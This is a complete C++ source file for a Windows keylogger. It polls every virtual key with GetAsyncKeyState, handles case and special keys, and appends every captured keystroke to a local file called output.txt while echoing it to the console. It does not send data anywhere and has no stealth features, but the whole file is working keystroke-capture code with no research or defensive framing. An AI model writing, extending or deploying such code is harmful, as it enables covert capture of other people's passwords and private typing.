#include "keyboard.h"
bool isCapsLock() {
	if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
		return true;
	else
		return false;
}

bool isShift() {
	if ((GetKeyState(VK_SHIFT) & 0x8000) != 0)
		return true;
	else
		return false;
}

auto detectKey() {
	while (1)
	{
		for (DWORD press = 0x08; press <= 0xFE; press=press+0x1) {
			if (GetAsyncKeyState(press) & 0x8000) {
				std::this_thread::sleep_for(std::chrono::milliseconds(99));
				std::string aya(1, press);
				if (!(isShift() ^ isCapsLock())) {
				boost::algorithm::to_lower(aya);
				}
				switch (press) {
				case VK_SPACE:
					aya = "[Space]";
					break;
				case VK_SHIFT:
					aya = "[Shift]";
					break;
				case VK_RSHIFT:
					aya = "[RSHIFT]";
					break;
				case VK_RETURN:
					aya = "[Enter]";
					break;
				case VK_TAB:
					aya = "[TAB]";
					break;
				case VK_CONTROL:
					aya = "[CTRL]";
					break;
				case VK_DELETE:
					aya = "[DEL]";
					break;
				case VK_CAPITAL:
					aya = "[Caps Lock]";
					break;
				case VK_BACK:
					aya = "[Backspace]";
					break;
				}

				return aya;
			}
		}

	}
}
void WritefileAya()
{
	std::ofstream myfile;
	while (true) {
		std::string key = detectKey();
		myfile.open("output.txt",std::ofstream::app);
		myfile << key;
		myfile.close();

	}
}

auto migrant()
{
	while (true)
	{
		std::string key = detectKey();
		std::cout << key;
	}
}

int main()
{

	std::thread t1;
	std::thread t2;
	t1 = std::thread(migrant);
	t2 = std::thread(WritefileAya);
	t1.join();
	t2.join();
}
